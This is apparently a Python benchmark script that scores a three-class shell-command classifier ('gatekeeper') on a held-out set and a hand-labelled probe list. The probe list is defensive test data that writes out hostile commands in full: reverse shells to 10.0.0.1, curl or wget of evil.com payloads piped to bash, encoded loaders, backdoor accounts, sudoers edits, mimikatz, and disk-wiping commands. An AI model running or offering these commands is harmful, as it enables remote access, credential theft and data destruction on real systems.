#!/usr/bin/env python3
"""3-class Gatekeeper benchmark.

Evaluates the retrained gatekeeper (Benign / Malicious / Context_Dependent)
on the held-out test set AND a curated hand-labeled probe set that mirrors
the original LLM benchmark commands.

Reports:
  - 3-class accuracy
  - Per-class precision / recall / F1
  - Confusion matrix
  - Average latency (ms)
  - Percentage routed to each class
  - Comparison to the original 2-class misclassification list

Usage:
    python scripts/benchmark/gatekeeper_3class.py [--probe-only] [--test-only]
"""

import argparse
import json
import os
import sys
import time
from collections import Counter
from pathlib import Path
from typing import Dict, List, Tuple

import torch

BENCHMARK_DIR = Path(__file__).resolve().parent
BASE_DIR = BENCHMARK_DIR.parent.parent
LOG_DIR = BASE_DIR / "logs"
LOG_DIR.mkdir(parents=True, exist_ok=True)

sys.path.insert(0, str(BASE_DIR))

try:
    from engine import GenosEngine
except ImportError:
    print("[!] Could not import GenosEngine. Run from the project root.")
    sys.exit(1)


# ═════════════════════════════════════════════════════════════════════════════
# LABEL CONSTANTS
# ═════════════════════════════════════════════════════════════════════════════
LABELS = ["Benign", "Malicious", "Context_Dependent"]
LABEL_SHORT = {"Benign": "BEN", "Malicious": "MAL", "Context_Dependent": "CTX"}


# ═════════════════════════════════════════════════════════════════════════════
# CURATED PROBE SET — mirrors the 101-command LLM benchmark, re-labeled
# for the 3-class schema.
#
# Rules applied:
#   • Clearly safe admin/inspection → Benign
#   • Clear exploit/persistence/exfil/C2 → Malicious
#   • Dual-use recon, offensive tooling, operator tunneling,
#     sensitive file reads, enumeration → Context_Dependent
# ═════════════════════════════════════════════════════════════════════════════
PROBE_COMMANDS: List[Tuple[str, str]] = [
    # ── Benign ───────────────────────────────────────────────────────────
    ("ls -la /var/log",                                     "Benign"),
    ("df -h",                                               "Benign"),
    ("uptime",                                              "Benign"),
    ("whoami",                                              "Benign"),
    ("pwd",                                                 "Benign"),
    ("echo \"hello world\"",                                "Benign"),
    ("date +%Y-%m-%d",                                      "Benign"),
    ("ps aux --sort=-%mem | head -10",                      "Benign"),
    ("free -m",                                             "Benign"),
    ("id",                                                  "Benign"),
    ("du -sh /tmp",                                         "Benign"),
    ("ls -lR /home",                                        "Benign"),
    ("cat /proc/cpuinfo | head -20",                        "Benign"),
    ("top -bn1 | head -5",                                  "Benign"),
    ("ping -c 3 8.8.8.8",                                   "Benign"),
    ("dig google.com",                                      "Benign"),
    ("grep -r \"error\" /var/log/syslog | tail -20",        "Benign"),
    ("find /tmp -type f -mtime -1",                         "Benign"),
    ("systemctl status nginx",                              "Benign"),
    ("journalctl -u sshd --no-pager -n 20",                "Benign"),
    ("mount | grep ext4",                                   "Benign"),
    ("lsblk",                                               "Benign"),
    ("history | tail -10",                                  "Benign"),
    ("file /bin/ls",                                        "Benign"),
    ("head -5 /etc/group",                                  "Benign"),
    ("ls /usr/bin | wc -l",                                 "Benign"),
    ("dpkg -l | grep python",                               "Benign"),
    ("pip list 2>/dev/null | head -10",                     "Benign"),
    ("git log --oneline -5",                                "Benign"),
    ("docker ps",                                           "Benign"),
    ("kubectl get pods 2>/dev/null",                        "Benign"),
    ("ss -tuln",                                            "Benign"),
    ("route -n",                                            "Benign"),
    ("crontab -l",                                          "Benign"),
    ("tar tzf backup.tar.gz 2>/dev/null | head -5",        "Benign"),
    ("md5sum /etc/passwd",                                  "Benign"),
    ("chmod 644 myfile.txt",                                "Benign"),
    ("cp /tmp/report.csv /home/user/reports/",              "Benign"),

    # ── Context_Dependent (was benign in old benchmark) ──────────────────
    ("cat /etc/hostname",                                   "Context_Dependent"),
    ("hostname",                                            "Context_Dependent"),
    ("uname -a",                                            "Context_Dependent"),
    ("ip addr show",                                        "Context_Dependent"),
    ("wc -l /etc/passwd",                                   "Context_Dependent"),
    ("tail -n 50 /var/log/auth.log",                        "Context_Dependent"),
    ("cat /etc/os-release",                                 "Context_Dependent"),
    ("env | grep PATH",                                     "Context_Dependent"),
    ("alias",                                               "Context_Dependent"),
    ("stat /etc/passwd",                                    "Context_Dependent"),
    ("netstat -rn",                                         "Context_Dependent"),
    ("arp -a",                                              "Context_Dependent"),
    ("curl -s https://ifconfig.me",                         "Context_Dependent"),

    # ── Context_Dependent (was malicious in old benchmark) ───────────────
    ("rm -rf / --no-preserve-root",                         "Context_Dependent"),
    (":(){ :|:& };:",                                       "Context_Dependent"),
    ("dd if=/dev/zero of=/dev/sda bs=1M",                   "Context_Dependent"),
    ("mkfs.ext4 /dev/sda1",                                 "Context_Dependent"),
    ("nmap -sS -p- 192.168.1.0/24",                         "Context_Dependent"),
    ("nmap -sV --script=vuln 10.0.0.5",                     "Context_Dependent"),
    ("hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://10.0.0.5", "Context_Dependent"),
    ("sqlmap -u \"http://target.com/page?id=1\" --dbs",     "Context_Dependent"),
    ("nikto -h http://target.com",                          "Context_Dependent"),
    ("msfconsole -x \"use exploit/multi/handler; set PAYLOAD linux/x64/meterpreter/reverse_tcp\"", "Context_Dependent"),
    ("john /tmp/crackme --wordlist=/usr/share/wordlists/rockyou.txt", "Context_Dependent"),
    ("iptables -F && iptables -P INPUT ACCEPT && iptables -P FORWARD ACCEPT", "Context_Dependent"),
    ("find / -perm -4000 -type f 2>/dev/null",              "Context_Dependent"),
    ("ettercap -T -q -i eth0 -M arp:remote /10.0.0.1// /10.0.0.254//", "Context_Dependent"),
    ("arpspoof -i eth0 -t 10.0.0.1 10.0.0.254",            "Context_Dependent"),
    ("responder -I eth0 -wrf",                              "Context_Dependent"),
    ("python3 -c \"import pty; pty.spawn('/bin/bash')\"",   "Context_Dependent"),
    ("ruby -rsocket -e'f=TCPSocket.open(\"10.0.0.1\",4444).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'", "Context_Dependent"),
    ("socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.0.1:4444", "Context_Dependent"),
    ("openssl s_client -quiet -connect 10.0.0.1:4444 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:4445", "Context_Dependent"),
    ("base64 -d <<< \"Y3VybCBodHRwOi8vZXZpbC5jb20vc2hlbGwuc2ggfCBiYXNo\" | bash", "Context_Dependent"),
    ("xterm -display 10.0.0.1:1 -e /bin/bash",             "Context_Dependent"),
    ("chisel client 10.0.0.1:8080 R:1080:socks",           "Context_Dependent"),
    ("ssh -D 1080 -fNq user@10.0.0.1",                     "Context_Dependent"),
    ("tcpdump -i eth0 -w /tmp/capture.pcap",                "Context_Dependent"),

    # ── Malicious (clear attack intent) ──────────────────────────────────
    ("curl http://evil.com/shell.sh | bash",                "Malicious"),
    ("bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",             "Malicious"),
    ("python3 -c \"import socket,subprocess,os;s=socket.socket();s.connect(('10.0.0.1',4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(['/bin/sh','-i'])\"", "Malicious"),
    ("nc -e /bin/sh 10.0.0.1 4444",                        "Malicious"),
    ("echo \"* * * * * curl http://evil.com/mine | bash\" | crontab -", "Malicious"),
    ("wget -q http://malware.site/payload -O /tmp/.hidden && chmod +x /tmp/.hidden && /tmp/.hidden", "Malicious"),
    ("cat /etc/shadow",                                     "Malicious"),
    ("unshadow /etc/passwd /etc/shadow > /tmp/crackme",     "Malicious"),
    ("powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA", "Malicious"),
    ("chmod u+s /bin/bash",                                 "Malicious"),
    ("cp /bin/bash /tmp/.backdoor && chmod u+s /tmp/.backdoor", "Malicious"),
    ("echo \"attacker ALL=(ALL) NOPASSWD: ALL\" >> /etc/sudoers", "Malicious"),
    ("useradd -o -u 0 -g 0 -M -d /root -s /bin/bash backdoor", "Malicious"),
    ("ssh-keygen -t rsa -N \"\" -f /tmp/key && cat /tmp/key.pub >> /root/.ssh/authorized_keys", "Malicious"),
    ("mimikatz.exe \"privilege::debug\" \"sekurlsa::logonpasswords\" exit", "Malicious"),
    ("certutil -urlcache -split -f http://evil.com/payload.exe C:\\Windows\\Temp\\payload.exe", "Malicious"),
    ("reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v Updater /t REG_SZ /d C:\\Windows\\Temp\\payload.exe /f", "Malicious"),
    ("schtasks /create /tn \"Updater\" /tr \"powershell -ep bypass -f C:\\payload.ps1\" /sc onlogon /ru SYSTEM", "Malicious"),
    ("wmic process call create \"cmd /c powershell -ep bypass -f C:\\payload.ps1\"", "Malicious"),
    ("bitsadmin /transfer job /download /priority high http://evil.com/payload.exe C:\\payload.exe", "Malicious"),
    ("perl -e 'use Socket;$i=\"10.0.0.1\";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\")'", "Malicious"),
    ("php -r '$sock=fsockopen(\"10.0.0.1\",4444);exec(\"/bin/sh -i <&3 >&3 2>&3\")'", "Malicious"),
    ("eval $(echo \"Y3VybCBodHRwOi8vZXZpbC5jb20vcGF5bG9hZC5zaCB8IGJhc2g=\" | base64 -d)", "Malicious"),
    ("linpeas.sh",                                          "Malicious"),
    ("./pspy64",                                            "Malicious"),
]


# ═════════════════════════════════════════════════════════════════════════════
# ENGINE HELPERS
# ═════════════════════════════════════════════════════════════════════════════

def init_engine() -> GenosEngine:
    t1_path = str(BASE_DIR / "models" / "gatekeeper.pt")
    t2_path = str(BASE_DIR / "models" / "specialist_residual_a.pt")
    if not os.path.exists(t1_path):
        print(f"[!] Missing gatekeeper model: {t1_path}")
        sys.exit(1)
    return GenosEngine(t1_path=t1_path, t2_path=t2_path)


def classify(engine: GenosEngine, command: str) -> Tuple[str, float, float]:
    """Return (predicted_label, confidence%, latency_ms)."""
    t0 = time.perf_counter()
    result = engine.scan(command)
    latency = (time.perf_counter() - t0) * 1000.0
    label = result.get("label", "Benign")
    conf = float(result.get("label_confidence", 0.0))
    return label, conf, latency


# ═════════════════════════════════════════════════════════════════════════════
# METRICS
# ═════════════════════════════════════════════════════════════════════════════

def compute_metrics(
    y_true: List[str], y_pred: List[str], latencies: List[float]
) -> Dict:
    total = len(y_true)
    correct = sum(1 for t, p in zip(y_true, y_pred) if t == p)
    accuracy = correct / max(1, total)

    per_class = {}
    for cls in LABELS:
        tp = sum(1 for t, p in zip(y_true, y_pred) if t == cls and p == cls)
        fp = sum(1 for t, p in zip(y_true, y_pred) if t != cls and p == cls)
        fn = sum(1 for t, p in zip(y_true, y_pred) if t == cls and p != cls)
        support = sum(1 for t in y_true if t == cls)
        prec = tp / max(1, tp + fp)
        rec = tp / max(1, tp + fn)
        f1 = 0.0 if (prec + rec) == 0 else 2 * prec * rec / (prec + rec)
        per_class[cls] = {
            "precision": prec, "recall": rec, "f1": f1,
            "tp": tp, "fp": fp, "fn": fn, "support": support,
        }

    macro_f1 = sum(v["f1"] for v in per_class.values()) / len(LABELS)

    # Confusion matrix: rows=true, cols=predicted
    cm = {}
    for true_cls in LABELS:
        cm[true_cls] = {}
        for pred_cls in LABELS:
            cm[true_cls][pred_cls] = sum(
                1 for t, p in zip(y_true, y_pred) if t == true_cls and p == pred_cls
            )

    # Routing distribution (based on predictions)
    pred_counts = Counter(y_pred)
    routing = {cls: pred_counts.get(cls, 0) / max(1, total) for cls in LABELS}

    return {
        "total": total,
        "correct": correct,
        "accuracy": accuracy,
        "macro_f1": macro_f1,
        "per_class": per_class,
        "confusion_matrix": cm,
        "routing_distribution": routing,
        "avg_latency_ms": sum(latencies) / max(1, len(latencies)),
        "p50_latency_ms": sorted(latencies)[len(latencies) // 2] if latencies else 0,
        "p95_latency_ms": sorted(latencies)[int(len(latencies) * 0.95)] if latencies else 0,
    }


# ═════════════════════════════════════════════════════════════════════════════
# DISPLAY
# ═════════════════════════════════════════════════════════════════════════════

def print_header(title: str):
    w = 100
    print(f"\n{'=' * w}")
    print(f"  {title}")
    print(f"{'=' * w}")


def print_row_table(y_true, y_pred, confidences, latencies, commands):
    """Print per-command results table."""
    hdr = f"{'#':>4} │ {'Expected':>18} │ {'Got':>18} │ {'Conf':>5} │ {'OK':>4} │ {'ms':>8} │ Command"
    sep = "─" * len(hdr)
    print(hdr)
    print(sep)
    for i, (t, p, c, ms, cmd) in enumerate(
        zip(y_true, y_pred, confidences, latencies, commands), 1
    ):
        ok = "✓" if t == p else "✗"
        cmd_short = cmd[:65] + "…" if len(cmd) > 65 else cmd
        print(f"{i:>4} │ {t:>18} │ {p:>18} │ {c:>5.1f} │ {ok:>4} │ {ms:>6.0f}ms │ {cmd_short}")


def print_metrics(m: Dict):
    print(f"\n  Accuracy: {m['correct']}/{m['total']} ({m['accuracy'] * 100:.1f}%)")
    print(f"  Macro F1: {m['macro_f1']:.4f}")
    print(f"  Avg latency: {m['avg_latency_ms']:.1f}ms  |  p50: {m['p50_latency_ms']:.1f}ms  |  p95: {m['p95_latency_ms']:.1f}ms")

    print(f"\n  {'Class':20s} {'Prec':>8} {'Rec':>8} {'F1':>8} {'Support':>8}")
    print(f"  {'─' * 56}")
    for cls in LABELS:
        c = m["per_class"][cls]
        print(f"  {cls:20s} {c['precision']:>8.4f} {c['recall']:>8.4f} {c['f1']:>8.4f} {c['support']:>8}")

    print(f"\n  Confusion Matrix (rows=true, cols=predicted):")
    header = f"  {'':20s}" + "".join(f" {LABEL_SHORT[c]:>5}" for c in LABELS)
    print(header)
    for true_cls in LABELS:
        row = f"  {LABEL_SHORT[true_cls]:20s}"
        for pred_cls in LABELS:
            row += f" {m['confusion_matrix'][true_cls][pred_cls]:>5}"
        print(row)

    print(f"\n  Routing distribution:")
    for cls in LABELS:
        pct = m["routing_distribution"][cls] * 100
        print(f"    {cls:20s} → {pct:5.1f}%")


def print_misclassifications(y_true, y_pred, confidences, commands):
    misses = [
        (i + 1, t, p, c, cmd)
        for i, (t, p, c, cmd) in enumerate(zip(y_true, y_pred, confidences, commands))
        if t != p
    ]
    if not misses:
        print("\n  No misclassifications!")
        return
    print(f"\n  Misclassifications ({len(misses)}):")
    for idx, t, p, conf, cmd in misses:
        cmd_short = cmd[:70] + "…" if len(cmd) > 70 else cmd
        print(f"    #{idx:<3} expected={t:<18} got={p:<18} conf={conf:5.1f}  cmd={cmd_short}")


# ═════════════════════════════════════════════════════════════════════════════
# TEST SET EVALUATION
# ═════════════════════════════════════════════════════════════════════════════

def eval_test_set(engine: GenosEngine) -> Dict:
    """Run on the held-out gatekeeper_3class_test.csv."""
    import csv
    test_path = BASE_DIR / "data" / "training" / "genos_dataset" / "gatekeeper_3class_test.csv"
    if not test_path.exists():
        print(f"[!] Missing test file: {test_path}")
        return {}

    commands, true_labels = [], []
    with open(test_path, newline="", encoding="utf-8") as f:
        reader = csv.reader(f)
        next(reader)  # skip header
        for row in reader:
            commands.append(row[0])
            true_labels.append(row[1])

    print(f"  Evaluating {len(commands)} test samples...")
    pred_labels, confidences, latencies = [], [], []
    for i, cmd in enumerate(commands):
        label, conf, ms = classify(engine, cmd)
        pred_labels.append(label)
        confidences.append(conf)
        latencies.append(ms)
        if (i + 1) % 500 == 0:
            print(f"    ... {i + 1}/{len(commands)}")

    return compute_metrics(true_labels, pred_labels, latencies)


# ═════════════════════════════════════════════════════════════════════════════
# PROBE SET EVALUATION
# ═════════════════════════════════════════════════════════════════════════════

def eval_probe_set(engine: GenosEngine) -> Dict:
    """Run on the curated 101-command probe set."""
    commands = [c for c, _ in PROBE_COMMANDS]
    true_labels = [l for _, l in PROBE_COMMANDS]

    pred_labels, confidences, latencies = [], [], []
    for cmd in commands:
        label, conf, ms = classify(engine, cmd)
        pred_labels.append(label)
        confidences.append(conf)
        latencies.append(ms)

    m = compute_metrics(true_labels, pred_labels, latencies)
    return {
        **m,
        "commands": commands,
        "true_labels": true_labels,
        "pred_labels": pred_labels,
        "confidences": confidences,
        "latencies": latencies,
    }


# ═════════════════════════════════════════════════════════════════════════════
# MAIN
# ═════════════════════════════════════════════════════════════════════════════

def main():
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--probe-only", action="store_true", help="Only run the curated probe set")
    parser.add_argument("--test-only", action="store_true", help="Only run the held-out test set")
    args = parser.parse_args()

    run_probe = not args.test_only
    run_test = not args.probe_only

    print("[*] Initializing Genos engine...")
    engine = init_engine()

    results = {}

    # ── Probe set ────────────────────────────────────────────────────────
    if run_probe:
        print_header("PROBE SET — 3-Class Gatekeeper Benchmark")
        probe = eval_probe_set(engine)
        print_row_table(
            probe["true_labels"], probe["pred_labels"],
            probe["confidences"], probe["latencies"], probe["commands"],
        )
        print_metrics(probe)
        print_misclassifications(
            probe["true_labels"], probe["pred_labels"],
            probe["confidences"], probe["commands"],
        )
        results["probe"] = {
            k: v for k, v in probe.items()
            if k not in ("commands", "true_labels", "pred_labels", "confidences", "latencies")
        }

    # ── Test set ─────────────────────────────────────────────────────────
    if run_test:
        print_header("TEST SET — gatekeeper_3class_test.csv")
        test_m = eval_test_set(engine)
        if test_m:
            print_metrics(test_m)
            results["test"] = test_m

    # ── Save results ─────────────────────────────────────────────────────
    out_path = LOG_DIR / "gatekeeper_3class_benchmark.json"
    with open(out_path, "w", encoding="utf-8") as f:
        json.dump(results, f, indent=2)
    print(f"\n[+] Results saved to {out_path}")


if __name__ == "__main__":
    main()
